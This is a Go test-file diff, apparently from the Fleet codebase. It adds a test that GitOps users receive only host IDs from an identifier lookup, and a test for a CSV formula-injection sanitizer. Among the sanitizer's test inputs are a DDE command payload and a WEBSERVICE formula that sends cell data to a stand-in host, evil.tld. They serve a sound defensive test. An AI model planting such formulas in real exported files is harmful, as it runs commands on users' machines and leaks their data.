@@ -1712,6 +1712,138 @@ func TestHostAuth(t *testing.T) {
 	// List, GetHostSummary work for all
 }
 
+// TestHostByIdentifierGitOpsGetsIDOnly asserts that GitOps, which is denied on
+// every other host read endpoint, doesn't get host details from the identifier
+// endpoint either: it only gets the host id it needs to resolve an identifier
+// for the deprecated Puppet module's profile pre-assignment flow.
+func TestHostByIdentifierGitOpsGetsIDOnly(t *testing.T) {
+	ds := new(mock.Store)
+	svc, ctx := newTestService(t, ds, nil, nil)
+
+	const (
+		teamHostIdentifier   = "team-host"
+		globalHostIdentifier = "global-host"
+	)
+	teamHost := &fleet.Host{ID: 1, TeamID: new(uint(1)), Hostname: "team-host.example.com", HardwareSerial: "TEAMSERIAL", UUID: "team-uuid"}
+	globalHost := &fleet.Host{ID: 2, Hostname: "global-host.example.com", HardwareSerial: "GLOBALSERIAL", UUID: "global-uuid"}
+
+	ds.HostByIdentifierFunc = func(ctx context.Context, identifier string) (*fleet.Host, error) {
+		if identifier == teamHostIdentifier {
+			return teamHost, nil
+		}
+		return globalHost, nil
+	}
+	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+		return &fleet.AppConfig{}, nil
+	}
+	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error {
+		return nil
+	}
+	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) {
+		return nil, nil
+	}
+	ds.ListPacksForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Pack, error) {
+		return nil, nil
+	}
+	ds.ListHostBatteriesFunc = func(ctx context.Context, hid uint) ([]*fleet.HostBattery, error) {
+		return nil, nil
+	}
+	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*fleet.HostMaintenanceWindow, error) {
+		return nil, nil
+	}
+	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) {
+		return nil, nil
+	}
+	ds.ListHostDeviceMappingFunc = func(ctx context.Context, hid uint) ([]*fleet.HostDeviceMapping, error) {
+		return nil, nil
+	}
+	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*fleet.ScimUser, error) {
+		return nil, nil
+	}
+	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]fleet.HostCustomHostVital, error) {
+		return nil, nil
+	}
+	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
+		return nil, nil
+	}
+	ds.GetHostIssuesLastUpdatedFunc = func(ctx context.Context, hostID uint) (time.Time, error) {
+		return time.Time{}, nil
+	}
+	ds.UpdateHostIssuesFailingPoliciesForSingleHostFunc = func(ctx context.Context, hostID uint) error {
+		return nil
+	}
+	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
+		return false, nil
+	}
+	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *fleet.Host) (*fleet.HostLockWipeStatus, error) {
+		return &fleet.HostLockWipeStatus{}, nil
+	}
+
+	// requireIDOnly asserts the caller got the host id and no other host data,
+	// and that Fleet didn't even load the details it isn't allowed to see.
+	requireIDOnly := func(t *testing.T, wantID uint, host *fleet.HostDetail, err error) {
+		t.Helper()
+		require.NoError(t, err)
+		require.NotNil(t, host)
+		require.True(t, host.IDOnly)
+		require.Equal(t, wantID, host.ID)
+		require.Empty(t, host.Hostname)
+		require.Empty(t, host.HardwareSerial)
+		require.Empty(t, host.UUID)
+		require.Nil(t, host.TeamID)
+		require.Nil(t, host.Labels)
+		require.Nil(t, host.Packs)
+		require.False(t, ds.LoadHostSoftwareFuncInvoked)
+		require.False(t, ds.ListLabelsForHostFuncInvoked)
+		require.False(t, ds.ListPoliciesForHostFuncInvoked)
+	}
+
+	opts := fleet.HostDetailOptions{IncludePolicies: true}
+
+	t.Run("global gitops", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{ID: 1, GlobalRole: new(fleet.RoleGitOps)}})
+
+		host, err := svc.HostByIdentifier(ctx, globalHostIdentifier, opts)
+		requireIDOnly(t, globalHost.ID, host, err)
+
+		host, err = svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		requireIDOnly(t, teamHost.ID, host, err)
+	})
+
+	t.Run("team gitops on the host's team", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{
+			ID:    2,
+			Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleGitOps}},
+		}})
+
+		host, err := svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		requireIDOnly(t, teamHost.ID, host, err)
+	})
+
+	t.Run("team gitops on another team is denied", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{
+			ID:    3,
+			Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 2}, Role: fleet.RoleGitOps}},
+		}})
+
+		_, err := svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		checkAuthErr(t, true, err)
+	})
+
+	// Roles that do have host read access must keep getting the full details.
+	t.Run("global observer still gets details", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{ID: 4, GlobalRole: new(fleet.RoleObserver)}})
+
+		host, err := svc.HostByIdentifier(ctx, globalHostIdentifier, opts)
+		require.NoError(t, err)
+		require.Equal(t, uint(2), host.ID)
+		require.Equal(t, "global-host.example.com", host.Hostname)
+		require.Equal(t, "GLOBALSERIAL", host.HardwareSerial)
+		require.True(t, ds.ListLabelsForHostFuncInvoked)
+		require.True(t, ds.ListPoliciesForHostFuncInvoked)
+	})
+}
+
 func TestListHosts(t *testing.T) {
 	ds := new(mock.Store)
 	svc, ctx := newTestService(t, ds, nil, nil)
@@ -1762,6 +1894,62 @@ func TestListHosts(t *testing.T) {
 	require.NoError(t, err)
 	require.Len(t, hosts, 1)
 	require.True(t, ds.LoadHostSoftwareFuncInvoked)
+}
+
+func TestSanitizeCSVFormula(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"empty", "", ""},
+		{"equals", "=1+1", "'=1+1"},
+		{"plus", "+SUM(1,1)", "'+SUM(1,1)"},
+		{"minus", "-2+3", "'-2+3"},
+		{"at", "@SUM(1,1)", "'@SUM(1,1)"},
+		{"dde command", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
+		{"webservice exfiltration", `=WEBSERVICE("http://evil.tld/?x="&A1)`, `'=WEBSERVICE("http://evil.tld/?x="&A1)`},
+		{"tab", "\t=1+1", "'\t=1+1"},
+		{"carriage return", "\r=1+1", "'\r=1+1"},
+		{"hyphen leading text", "-laptop", "'-laptop"},
+		{"leading space", " =1+1", "' =1+1"},
+		{"leading spaces", "   @SUM(1,1)", "'   @SUM(1,1)"},
+		{"newline then formula", "\n=1+1", "'\n=1+1"},
+
+		// Values that must be left untouched.
+		{"whitespace only", "   ", "   "},
+		{"tab then text", "\tfoo", "\tfoo"},
+		{"leading space then number", " -1", " -1"},
+		{"trailing space after number", "-5 ", "-5 "},
+		{"integer", "42", "42"},
+		{"negative integer", "-1", "-1"},
+		{"negative float", "-1.5", "-1.5"},
+		{"positive sign", "+1", "+1"},
+		{"negative exponent", "-1.5e10", "-1.5e10"},
+		{"email", "user@example.com", "user@example.com"},
+		{"timestamp", "2022-03-15T17:23:56Z", "2022-03-15T17:23:56Z"},
+		{"hostname", "foo.local0", "foo.local0"},
+		{"zero", "0", "0"},
+		{"internal equals", "a=1+1", "a=1+1"},
+		{"newline leading", "\nfoo", "\nfoo"},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			t.Parallel()
+			require.Equal(t, c.want, sanitizeCSVFormula(c.in))
+		})
+	}
+
+	t.Run("already sanitized values are left alone", func(t *testing.T) {
+		t.Parallel()
+		// The single quote is not a formula trigger, so re-applying the
+		// transformation must not stack prefixes.
+		once := sanitizeCSVFormula("=1+1")
+		require.Equal(t, once, sanitizeCSVFormula(once))
+	})
 }
 
 func TestStreamHosts(t *testing.T) {
